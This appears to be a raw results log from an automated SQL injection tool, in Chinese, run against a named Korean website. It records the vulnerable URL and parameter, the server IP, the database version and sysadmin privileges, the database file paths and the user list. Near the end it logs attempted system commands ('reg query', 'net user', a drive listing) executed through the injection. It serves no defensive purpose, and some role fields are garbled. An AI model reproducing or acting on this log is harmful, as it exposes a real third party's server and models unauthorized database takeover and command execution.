@@ -1,0 +1,122 @@
+■漏洞信息:============================================================
+ ·URL:http://ntabi.kr/busan_ntabi/community/Pboard/read.asp?page=3&Board=1&id=167
+ ·页面标题：
+  
+  浚鸥厚 老夯咯青狼 葛电巴
+  
+  
+ ·参数:page=3&Board=1&id=167
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:210.116.103.104
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:07:03 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 60343
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDCQTCBTRS=ECBEEFCADCAAGNBAPGOEJBND; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：ntabi_home
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Workgroup Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：ENTABI
+- 服务名：MSSQLSERVER
+- 系统用户名：ntabi
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf	
+tempdb	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf	
+model	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf	
+msdb	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf	
+AdventureWorksDW	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\AdventureWorksDW_Data.mdf	
+AdventureWorks	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\AdventureWorks_Data.mdf	
+ntabi_db	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\ntabi_db.mdf	
+db_BkSystem	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\db_BkSystem.mdf	
+db_BK_S	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\db_BK_S.mdf	
+sqlDB	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\sqlDB.mdf	
+bsae_blog	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\bsae_blog.mdf	
+Blog	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\Blog.mdf	
+ntabi_grobal	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\ntabi_grobal.mdf	
+inside	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\inside.mdf	
+ntabi_home	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\ntabi_home.mdf	
+NTABIS	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\NTABIS.mdf	
+store	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\store.mdf	
+test_store	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\test.mdf	
+db_OIT	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\db_OIT.mdf	
+RE_NTABI	D:\Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\RE_NTABI.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+##MS_AgentSigningCertificate##		?..?.）?????甋???	10 14 2005  1:56AM	
+ENTABI\SQLServer2005MSFTEUser$ENTABI$MSSQLSERVER		?..?.????噲迷?.	03  8 2007  1:56PM	
+ntabi		?臠??匃?胙?	03  9 2007 11:48AM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+Internet Information Services	sleeping	ENTABI	2420	AWAITING COMMAND		
+Internet Information Services	sleeping	ENTABI	2420	AWAITING COMMAND		
+Internet Information Services	sleeping	ENTABI	2420	AWAITING COMMAND		
+Internet Information Services	sleeping	ENTABI	2420	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+ENTABI	SQL Server	SQLOLEDB	ENTABI		ENTABI	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+取记录数失败，使用设定值：5
+■net user
+取记录数失败，使用设定值：5
+■net user
+取记录数失败，使用设定值：5
+Dir of D:: 
+一次性获取失败，正在批次获取……
